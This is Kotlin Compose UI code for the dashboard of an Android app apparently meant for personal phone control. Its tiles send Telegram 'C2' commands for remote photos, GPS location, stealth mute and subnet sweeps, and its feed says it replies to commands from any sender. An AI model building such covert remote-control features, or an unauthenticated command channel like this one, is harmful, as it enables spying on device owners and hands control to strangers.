package com.example.ui.screens.dashboard

import android.content.Context
import android.content.Intent
import android.widget.Toast
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.Send
import androidx.compose.material.icons.filled.Apps
import androidx.compose.material.icons.filled.BatteryAlert
import androidx.compose.material.icons.filled.BatteryChargingFull
import androidx.compose.material.icons.filled.CameraAlt
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.CloudDone
import androidx.compose.material.icons.filled.DirectionsWalk
import androidx.compose.material.icons.filled.LocationOn
import androidx.compose.material.icons.filled.Mic
import androidx.compose.material.icons.filled.NotificationsActive
import androidx.compose.material.icons.filled.PhoneAndroid
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.material.icons.filled.Psychology
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.Sensors
import androidx.compose.material.icons.filled.SignalCellularAlt
import androidx.compose.material.icons.filled.Speed
import androidx.compose.material.icons.filled.Timer
import androidx.compose.material.icons.filled.VolumeOff
import androidx.compose.material.icons.filled.Wifi
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.LinearProgressIndicator
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.Surface
import androidx.compose.material3.Switch
import androidx.compose.material3.SwitchDefaults
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import com.example.core.recorder.TelegramC2Manager
import com.example.ui.EnforcerViewModel
import com.example.ui.theme.HarmonyGlassCard
import com.example.ui.theme.KamakuraCloudShadow
import com.example.ui.theme.KamakuraCloudWhite
import com.example.ui.theme.KamakuraCoralWarning
import com.example.ui.theme.KamakuraDeepCobalt
import com.example.ui.theme.KamakuraEmerald
import com.example.ui.theme.KamakuraSignBlue
import com.example.ui.theme.KamakuraSkyBackground
import com.example.ui.theme.KamakuraSkyBlue
import com.example.ui.theme.KamakuraSoftHorizon
import com.example.ui.theme.KamakuraSunWarmth
import com.example.ui.theme.KamakuraTextPrimary
import com.example.ui.theme.KamakuraTextSecondary
import com.example.ui.theme.LiquidGlassButton
import com.example.ui.theme.LiquidGlassCard
import com.example.ui.theme.LiquidGlassFill
import com.example.ui.theme.PaletteCornflower
import com.example.ui.theme.PaletteIceCyan
import com.example.ui.theme.PaletteMintFrost
import com.example.ui.theme.PaletteSoftSky
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

@Composable
fun DashboardScreen(
    viewModel: EnforcerViewModel,
    onNavigateToChatAi: () -> Unit = {}
) {
    val context = LocalContext.current
    val scrollState = rememberScrollState()

    // Telemetry & Hardware States
    val batteryStatus by viewModel.batteryStatus.collectAsStateWithLifecycle()
    val stepsToday by viewModel.stepsToday.collectAsStateWithLifecycle()
    val stepGoal by viewModel.stepGoal.collectAsStateWithLifecycle()
    val walkingState by viewModel.walkingState.collectAsStateWithLifecycle()
    val screenTimeMinutes by viewModel.screenTimeMinutes.collectAsStateWithLifecycle()
    val unlockCount by viewModel.unlockCount.collectAsStateWithLifecycle()
    val passiveBssidCount by viewModel.passiveBssidCount.collectAsStateWithLifecycle()
    val networkType by viewModel.networkType.collectAsStateWithLifecycle()
    val proximitySummary by viewModel.proximitySummary.collectAsStateWithLifecycle()
    val lastPinnedGps by viewModel.lastPinnedGps.collectAsStateWithLifecycle()
    val deviceProfile by viewModel.deviceProfile.collectAsStateWithLifecycle()

    // C2 Telegram Auto-Responder Manager
    val c2Manager = remember { TelegramC2Manager.getInstance(context) }
    val lastC2Command by c2Manager.lastExecutedCommand.collectAsStateWithLifecycle()
    val c2Logs by c2Manager.commandLogs.collectAsStateWithLifecycle()
    val isC2Active by c2Manager.isPollingActive.collectAsStateWithLifecycle()

    var showActionToast by remember { mutableStateOf<String?>(null) }

    LaunchedEffect(Unit) {
        viewModel.refreshBattery()
    }

    showActionToast?.let { msg ->
        Toast.makeText(context, msg, Toast.LENGTH_SHORT).show()
        showActionToast = null
    }

    KamakuraSkyBackground {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(horizontal = 16.dp)
                .verticalScroll(scrollState)
                .testTag("dashboard_screen"),
            verticalArrangement = Arrangement.spacedBy(14.dp)
        ) {
            Spacer(modifier = Modifier.height(10.dp))

            // ─── 1. MISSION CONTROL HEADER CARD ──────────────────────────────
            HarmonyGlassCard(
                modifier = Modifier.fillMaxWidth(),
                cornerRadius = 24.dp,
                elevation = 4.dp
            ) {
                Column(modifier = Modifier.padding(18.dp)) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Column {
                            Row(
                                verticalAlignment = Alignment.CenterVertically,
                                horizontalArrangement = Arrangement.spacedBy(8.dp)
                            ) {
                                Box(
                                    modifier = Modifier
                                        .size(10.dp)
                                        .clip(CircleShape)
                                        .background(KamakuraEmerald)
                                )
                                Text(
                                    text = "REMIX ENFORCER OS",
                                    fontSize = 18.sp,
                                    fontWeight = FontWeight.Black,
                                    letterSpacing = 1.sp,
                                    color = KamakuraSignBlue
                                )
                            }
                            Text(
                                text = "Secondary Brain 2.0 • Autonomous Mobile Sentinel HUD",
                                fontSize = 11.sp,
                                color = KamakuraTextSecondary
                            )
                        }

                        // Battery Indicator Pill
                        Surface(
                            shape = RoundedCornerShape(12.dp),
                            color = PaletteMintFrost.copy(alpha = 0.75f),
                            border = androidx.compose.foundation.BorderStroke(1.dp, PaletteSoftSky)
                        ) {
                            Row(
                                modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
                                verticalAlignment = Alignment.CenterVertically,
                                horizontalArrangement = Arrangement.spacedBy(4.dp)
                            ) {
                                Icon(
                                    imageVector = if (batteryStatus.isCharging) Icons.Default.BatteryChargingFull else Icons.Default.BatteryAlert,
                                    contentDescription = "Battery",
                                    tint = PaletteCornflower,
                                    modifier = Modifier.size(14.dp)
                                )
                                Text(
                                    text = "${batteryStatus.percent}% ${if (batteryStatus.isCharging) "⚡" else ""}",
                                    fontSize = 11.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = PaletteCornflower
                                )
                            }
                        }
                    }

                    Spacer(modifier = Modifier.height(12.dp))

                    // Cloud Host Status & Device Anchor Row
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        // Render Cloud Host Status Pill
                        Surface(
                            shape = RoundedCornerShape(10.dp),
                            color = PaletteIceCyan.copy(alpha = 0.65f),
                            modifier = Modifier.padding(end = 4.dp)
                        ) {
                            Row(
                                modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
                                verticalAlignment = Alignment.CenterVertically,
                                horizontalArrangement = Arrangement.spacedBy(5.dp)
                            ) {
                                Box(
                                    modifier = Modifier
                                        .size(7.dp)
                                        .clip(CircleShape)
                                        .background(KamakuraEmerald)
                                )
                                Text(
                                    text = "Render Cloud: ONLINE (Keep-Alive)",
                                    fontSize = 10.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = KamakuraTextPrimary
                                )
                            }
                        }

                        // Device UUID Pill
                        Text(
                            text = "UUID: ${(deviceProfile?.deviceUuid ?: "ENF-001").take(10)}...",
                            fontSize = 10.sp,
                            fontFamily = FontFamily.Monospace,
                            fontWeight = FontWeight.Bold,
                            color = KamakuraTextSecondary
                        )
                    }
                }
            }

            // ─── 2. C2 HARDWARE ACTION LAUNCHER MATRIX ────────────────────────
            Text(
                text = "⚡ C2 HARDWARE ACTION MATRIX",
                fontSize = 12.sp,
                fontWeight = FontWeight.Black,
                letterSpacing = 0.5.sp,
                color = KamakuraDeepCobalt
            )

            // Grid of 8 Quick Action Tiles
            Column(
                modifier = Modifier.fillMaxWidth(),
                verticalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                // Row 1: GPS Beacon & Camera Snapshot
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    C2ActionTile(
                        modifier = Modifier.weight(1f),
                        icon = Icons.Default.LocationOn,
                        title = "Pin GPS",
                        subtitle = "Satellite Beacon",
                        tintColor = PaletteCornflower,
                        onClick = {
                            viewModel.pinGps()
                            c2Manager.executeCommand("/locate")
                            showActionToast = "📍 GPS Beacon pinned & dispatched!"
                        }
                    )
                    C2ActionTile(
                        modifier = Modifier.weight(1f),
                        icon = Icons.Default.CameraAlt,
                        title = "Remote Camera",
                        subtitle = "Instant Snapshot",
                        tintColor = PaletteSoftSky,
                        onClick = {
                            c2Manager.executeCommand("/photo")
                            showActionToast = "📸 Snapshot triggered via sensor!"
                        }
                    )
                }

                // Row 2: Locator Siren & Stealth Mute
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    C2ActionTile(
                        modifier = Modifier.weight(1f),
                        icon = Icons.Default.NotificationsActive,
                        title = "Locator Siren",
                        subtitle = "100% Alarm + Strobe",
                        tintColor = KamakuraSunWarmth,
                        onClick = {
                            c2Manager.executeCommand("/siren 15")
                            showActionToast = "🚨 100% Volume Siren & Torch active!"
                        }
                    )
                    C2ActionTile(
                        modifier = Modifier.weight(1f),
                        icon = Icons.Default.VolumeOff,
                        title = "Stealth Mute",
                        subtitle = "0% All Channels",
                        tintColor = PaletteCornflower,
                        onClick = {
                            c2Manager.executeCommand("/mute")
                            showActionToast = "🔇 All audio streams muted to 0%!"
                        }
                    )
                }

                // Row 3: ARP Sentinel & Subnet Scan
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    C2ActionTile(
                        modifier = Modifier.weight(1f),
                        icon = Icons.Default.Security,
                        title = "ARP Sentinel",
                        subtitle = "Anti-Spoofing Audit",
                        tintColor = KamakuraEmerald,
                        onClick = {
                            c2Manager.executeCommand("/arp")
                            showActionToast = "🛡️ ARP table audit dispatched!"
                        }
                    )
                    C2ActionTile(
                        modifier = Modifier.weight(1f),
                        icon = Icons.Default.Sensors,
                        title = "Subnet Sweep",
                        subtitle = "Network Interface",
                        tintColor = PaletteCornflower,
                        onClick = {
                            c2Manager.executeCommand("/netscan")
                            showActionToast = "🌐 Subnet sweep triggered!"
                        }
                    )
                }

                // Row 4: Fast App Launcher & Media Play
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    C2ActionTile(
                        modifier = Modifier.weight(1f),
                        icon = Icons.Default.Apps,
                        title = "Quick App",
                        subtitle = "Launch Spotify/YT",
                        tintColor = PaletteCornflower,
                        onClick = {
                            c2Manager.executeCommand("/app spotify")
                            showActionToast = "🚀 App launch triggered on screen!"
                        }
                    )
                    C2ActionTile(
                        modifier = Modifier.weight(1f),
                        icon = Icons.Default.PlayArrow,
                        title = "Media Stream",
                        subtitle = "Play Synthwave",
                        tintColor = PaletteSoftSky,
                        onClick = {
                            c2Manager.executeCommand("/play synthwave")
                            showActionToast = "🎵 Streaming audio started!"
                        }
                    )
                }
            }

            // ─── 3. NETWORK & ARP SENTINEL HUD CARD ───────────────────────────
            HarmonyGlassCard(
                modifier = Modifier.fillMaxWidth(),
                cornerRadius = 20.dp
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            Box(
                                modifier = Modifier
                                    .size(32.dp)
                                    .clip(CircleShape)
                                    .background(KamakuraEmerald.copy(alpha = 0.15f)),
                                contentAlignment = Alignment.Center
                            ) {
                                Icon(
                                    imageVector = Icons.Default.Security,
                                    contentDescription = "Sentinel",
                                    tint = KamakuraEmerald,
                                    modifier = Modifier.size(18.dp)
                                )
                            }
                            Column {
                                Text(
                                    text = "Wi-Fi ARP Sentinel",
                                    fontWeight = FontWeight.Bold,
                                    fontSize = 13.sp,
                                    color = KamakuraSignBlue
                                )
                                Text(
                                    text = "$networkType • $proximitySummary",
                                    fontSize = 10.sp,
                                    color = KamakuraTextSecondary
                                )
                            }
                        }

                        Surface(
                            shape = RoundedCornerShape(10.dp),
                            color = KamakuraEmerald.copy(alpha = 0.15f),
                            border = androidx.compose.foundation.BorderStroke(1.dp, KamakuraEmerald.copy(alpha = 0.4f))
                        ) {
                            Text(
                                text = "🟢 SECURE",
                                fontSize = 10.sp,
                                fontWeight = FontWeight.Bold,
                                color = KamakuraEmerald,
                                modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)
                            )
                        }
                    }

                    Spacer(modifier = Modifier.height(10.dp))

                    Text(
                        text = "Real-time ARP packet inspection monitors hardware MAC bindings to prevent Man-in-the-Middle (MITM) and SSL strip attacks on public Wi-Fi.",
                        fontSize = 11.sp,
                        color = KamakuraTextSecondary,
                        lineHeight = 15.sp
                    )

                    Spacer(modifier = Modifier.height(10.dp))

                    Button(
                        onClick = {
                            c2Manager.executeCommand("/arp")
                            showActionToast = "🛡️ Inspecting ARP routing table..."
                        },
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(40.dp),
                        shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.buttonColors(containerColor = KamakuraSignBlue)
                    ) {
                        Icon(Icons.Default.Refresh, contentDescription = null, modifier = Modifier.size(16.dp))
                        Spacer(modifier = Modifier.width(6.dp))
                        Text("Audit Network ARP Table", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                    }
                }
            }

            // ─── 4. MEM0 BRAIN & INTELLIGENCE HUD ─────────────────────────────
            HarmonyGlassCard(
                modifier = Modifier.fillMaxWidth(),
                cornerRadius = 20.dp
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            Box(
                                modifier = Modifier
                                    .size(32.dp)
                                    .clip(CircleShape)
                                    .background(PaletteIceCyan),
                                contentAlignment = Alignment.Center
                            ) {
                                Icon(
                                    imageVector = Icons.Default.Psychology,
                                    contentDescription = "Mem0",
                                    tint = PaletteCornflower,
                                    modifier = Modifier.size(18.dp)
                                )
                            }
                            Column {
                                Text(
                                    text = "Mem0 Semantic Memory Graph",
                                    fontWeight = FontWeight.Bold,
                                    fontSize = 13.sp,
                                    color = KamakuraSignBlue
                                )
                                Text(
                                    text = "User: Harsh • Firestore Real-Time Sync",
                                    fontSize = 10.sp,
                                    color = KamakuraTextSecondary
                                )
                            }
                        }

                        Surface(
                            shape = RoundedCornerShape(10.dp),
                            color = PaletteMintFrost.copy(alpha = 0.7f)
                        ) {
                            Text(
                                text = "ACTIVE",
                                fontSize = 10.sp,
                                fontWeight = FontWeight.Bold,
                                color = PaletteCornflower,
                                modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)
                            )
                        }
                    }

                    Spacer(modifier = Modifier.height(10.dp))

                    Text(
                        text = "Autonomous memory reflection engine records user facts, hardware state transitions, and Telegram conversation turns into permanent vector memory.",
                        fontSize = 11.sp,
                        color = KamakuraTextSecondary,
                        lineHeight = 15.sp
                    )

                    Spacer(modifier = Modifier.height(10.dp))

                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        OutlinedButton(
                            onClick = {
                                c2Manager.executeCommand("/memory")
                                showActionToast = "🧠 Mem0 status queried!"
                            },
                            modifier = Modifier
                                .weight(1f)
                                .height(40.dp),
                            shape = RoundedCornerShape(12.dp)
                        ) {
                            Text("Query Mem0", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                        }

                        Button(
                            onClick = onNavigateToChatAi,
                            modifier = Modifier
                                .weight(1.2f)
                                .height(40.dp),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = PaletteCornflower)
                        ) {
                            Text("Open JARVIS Chat", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                }
            }

            // ─── 5. PHYSICAL TELEMETRY MATRIX ─────────────────────────────────
            Text(
                text = "📊 PHYSICAL SENSOR TELEMETRY",
                fontSize = 12.sp,
                fontWeight = FontWeight.Black,
                letterSpacing = 0.5.sp,
                color = KamakuraDeepCobalt
            )

            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(10.dp)
            ) {
                // Steps Sensor
                HarmonyGlassCard(
                    modifier = Modifier.weight(1f),
                    cornerRadius = 20.dp
                ) {
                    Column(modifier = Modifier.padding(14.dp)) {
                        Row(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                            Icon(
                                imageVector = Icons.Default.DirectionsWalk,
                                contentDescription = "Pedometer",
                                tint = KamakuraEmerald,
                                modifier = Modifier.size(16.dp)
                            )
                            Text(
                                text = "ACCELEROMETER",
                                fontSize = 9.sp,
                                fontWeight = FontWeight.Bold,
                                color = KamakuraTextSecondary
                            )
                        }
                        Spacer(modifier = Modifier.height(4.dp))
                        Text(
                            text = "$stepsToday",
                            fontSize = 20.sp,
                            fontWeight = FontWeight.Black,
                            color = KamakuraTextPrimary
                        )
                        Text(
                            text = "State: $walkingState",
                            fontSize = 10.sp,
                            color = KamakuraTextSecondary
                        )
                        Spacer(modifier = Modifier.height(6.dp))
                        LinearProgressIndicator(
                            progress = { (stepsToday.toFloat() / stepGoal).coerceIn(0f, 1f) },
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(5.dp)
                                .clip(RoundedCornerShape(3.dp)),
                            color = KamakuraEmerald,
                            trackColor = KamakuraCloudShadow
                        )
                    }
                }

                // Screen Usage & Unlocks
                HarmonyGlassCard(
                    modifier = Modifier.weight(1f),
                    cornerRadius = 20.dp
                ) {
                    Column(modifier = Modifier.padding(14.dp)) {
                        Row(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                            Icon(
                                imageVector = Icons.Default.Timer,
                                contentDescription = "Screen Time",
                                tint = PaletteCornflower,
                                modifier = Modifier.size(16.dp)
                            )
                            Text(
                                text = "SCREEN USAGE",
                                fontSize = 9.sp,
                                fontWeight = FontWeight.Bold,
                                color = KamakuraTextSecondary
                            )
                        }
                        Spacer(modifier = Modifier.height(4.dp))
                        Text(
                            text = "${screenTimeMinutes / 60}h ${screenTimeMinutes % 60}m",
                            fontSize = 20.sp,
                            fontWeight = FontWeight.Black,
                            color = KamakuraTextPrimary
                        )
                        Text(
                            text = "$unlockCount unlocks today",
                            fontSize = 10.sp,
                            color = KamakuraTextSecondary
                        )
                        Spacer(modifier = Modifier.height(6.dp))
                        LinearProgressIndicator(
                            progress = { (screenTimeMinutes.toFloat() / 360f).coerceIn(0f, 1f) },
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(5.dp)
                                .clip(RoundedCornerShape(3.dp)),
                            color = PaletteCornflower,
                            trackColor = KamakuraCloudShadow
                        )
                    }
                }
            }

            // ─── 6. LIVE REMOTE COMMAND ACTIVITY FEED ─────────────────────────
            HarmonyGlassCard(
                modifier = Modifier.fillMaxWidth(),
                cornerRadius = 20.dp
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Column {
                            Text(
                                text = "⚡ Instant Auto-Responder Feed",
                                fontWeight = FontWeight.Bold,
                                fontSize = 13.sp,
                                color = KamakuraSignBlue
                            )
                            Text(
                                text = "Replies to commands from any sender immediately",
                                fontSize = 10.sp,
                                color = KamakuraTextSecondary
                            )
                        }

                        Surface(
                            shape = RoundedCornerShape(10.dp),
                            color = if (isC2Active) KamakuraEmerald.copy(alpha = 0.15f) else KamakuraCoralWarning.copy(alpha = 0.15f)
                        ) {
                            Text(
                                text = if (isC2Active) "LISTENING" else "STANDBY",
                                fontSize = 9.sp,
                                fontWeight = FontWeight.Bold,
                                color = if (isC2Active) KamakuraEmerald else KamakuraCoralWarning,
                                modifier = Modifier.padding(horizontal = 6.dp, vertical = 3.dp)
                            )
                        }
                    }

                    Spacer(modifier = Modifier.height(8.dp))

                    // Last executed command banner
                    Surface(
                        shape = RoundedCornerShape(12.dp),
                        color = Color.White.copy(alpha = 0.9f),
                        modifier = Modifier.fillMaxWidth(),
                        border = androidx.compose.foundation.BorderStroke(1.dp, PaletteSoftSky)
                    ) {
                        Row(
                            modifier = Modifier.padding(10.dp),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            Icon(
                                imageVector = Icons.Default.Speed,
                                contentDescription = null,
                                tint = PaletteCornflower,
                                modifier = Modifier.size(16.dp)
                            )
                            Column {
                                Text(
                                    text = "LAST EXECUTED COMMAND",
                                    fontSize = 8.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = KamakuraTextSecondary
                                )
                                Text(
                                    text = lastC2Command,
                                    fontSize = 11.sp,
                                    fontWeight = FontWeight.Bold,
                                    fontFamily = FontFamily.Monospace,
                                    color = KamakuraTextPrimary
                                )
                            }
                        }
                    }

                    Spacer(modifier = Modifier.height(8.dp))

                    // Recent command logs (up to 4 entries)
                    if (c2Logs.isNotEmpty()) {
                        Column(verticalArrangement = Arrangement.spacedBy(4.dp)) {
                            c2Logs.take(4).forEach { logLine ->
                                Surface(
                                    shape = RoundedCornerShape(8.dp),
                                    color = KamakuraCloudShadow.copy(alpha = 0.2f),
                                    modifier = Modifier.fillMaxWidth()
                                ) {
                                    Text(
                                        text = logLine,
                                        fontSize = 10.sp,
                                        fontFamily = FontFamily.Monospace,
                                        color = KamakuraTextPrimary,
                                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
                                        maxLines = 1
                                    )
                                }
                            }
                        }
                    } else {
                        Text(
                            text = "No remote commands received yet. Send /list to the bot in Telegram.",
                            fontSize = 10.sp,
                            color = KamakuraTextSecondary
                        )
                    }
                }
            }

            Spacer(modifier = Modifier.height(20.dp))
        }
    }
}

@Composable
private fun C2ActionTile(
    modifier: Modifier = Modifier,
    icon: ImageVector,
    title: String,
    subtitle: String,
    tintColor: Color,
    onClick: () -> Unit
) {
    Surface(
        shape = RoundedCornerShape(16.dp),
        color = LiquidGlassFill,
        modifier = modifier
            .clip(RoundedCornerShape(16.dp))
            .clickable { onClick() }
            .border(
                1.dp,
                Brush.horizontalGradient(listOf(PaletteCornflower.copy(alpha = 0.4f), PaletteIceCyan.copy(alpha = 0.6f))),
                RoundedCornerShape(16.dp)
            )
    ) {
        Row(
            modifier = Modifier.padding(12.dp),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.spacedBy(10.dp)
        ) {
            Box(
                modifier = Modifier
                    .size(34.dp)
                    .clip(CircleShape)
                    .background(tintColor.copy(alpha = 0.18f)),
                contentAlignment = Alignment.Center
            ) {
                Icon(
                    imageVector = icon,
                    contentDescription = title,
                    tint = tintColor,
                    modifier = Modifier.size(18.dp)
                )
            }
            Column {
                Text(
                    text = title,
                    fontSize = 12.sp,
                    fontWeight = FontWeight.Bold,
                    color = KamakuraTextPrimary
                )
                Text(
                    text = subtitle,
                    fontSize = 9.sp,
                    color = KamakuraTextSecondary
                )
            }
        }
    }
}
